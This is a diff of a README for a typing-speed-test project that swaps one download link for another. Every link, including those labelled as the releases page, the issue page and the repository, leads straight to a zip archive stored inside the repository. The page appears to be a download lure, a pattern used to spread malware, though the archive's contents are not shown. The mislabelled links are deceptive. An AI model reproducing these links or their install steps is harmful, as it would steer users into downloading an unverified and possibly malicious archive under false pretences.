@@ -1,6 +1,6 @@
 # 🎉 TypingSpeedTest - Measure Your Typing Skills Easily
 
-[![Download TypingSpeedTest](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip)](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip)
+[![Download TypingSpeedTest](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip)](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to TypingSpeedTest! This website developed by Nojaid-Ad helps you measur
 
 ## 📥 Download & Install
 
-To download TypingSpeedTest, visit this page: [TypingSpeedTest Releases](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip). 
+To download TypingSpeedTest, visit this page: [TypingSpeedTest Releases](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip). 
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the latest release.
@@ -66,11 +66,11 @@ Yes, TypingSpeedTest works on mobile devices. Open your browser and visit the Ty
 
 Join our community to share tips, ask questions, and find others interested in improving their typing skills. 
 
-If you need help, you can open an issue on our [GitHub page](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip) or check the FAQs listed above.
+If you need help, you can open an issue on our [GitHub page](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip) or check the FAQs listed above.
 
 ## 🔗 Useful Links
 
-- [TypingSpeedTest Releases](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/LoCas343/TypingSpeedTest/main/js/view/Speed-Typing-Test-v3.8.zip)
+- [TypingSpeedTest Releases](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip)
+- [GitHub Repository](https://github.com/LoCas343/TypingSpeedTest/raw/refs/heads/main/assets/Speed_Typing_Test_2.4.zip)
 
 Enjoy improving your typing speed with TypingSpeedTest!
